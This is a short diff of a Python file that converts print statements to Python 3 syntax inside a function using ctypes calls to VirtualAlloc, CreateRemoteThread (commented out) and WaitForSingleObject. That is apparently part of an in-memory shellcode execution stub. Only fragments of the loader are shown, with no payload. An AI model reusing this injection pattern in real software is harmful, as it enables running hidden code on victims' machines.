@@ -41,7 +41,8 @@ def work( storage, message ) :
 
 	# def get_last_error(desc, val):
 	#         # return # Comment out the return to see return and error values
-	#         print "%s=0x%x, GetCurrentError=0x%x (%d)" % (desc, val, ctypes.windll.kernel32.GetLastError(), ctypes.windll.kernel32.GetLastError())
+	#         print( "%s=0x%x, GetCurrentError=0x%x (%d)" % (desc, val, ctypes.windll.kernel32.GetLastError(), ctypes.windll.kernel32.GetLastError()) )
+	
 
 
 	ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
@@ -87,9 +88,9 @@ def work( storage, message ) :
 	#                                          ctypes.pointer(ctypes.c_int(0)),
 	# 										 )
 	# get_last_error("CreateRemoteThread", remote_thread);
-	# print remote_thread
+	# print( remote_thread )
 	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
-	print "A"
+	print( "A" )
 
 
 if '__main__' == __name__ :
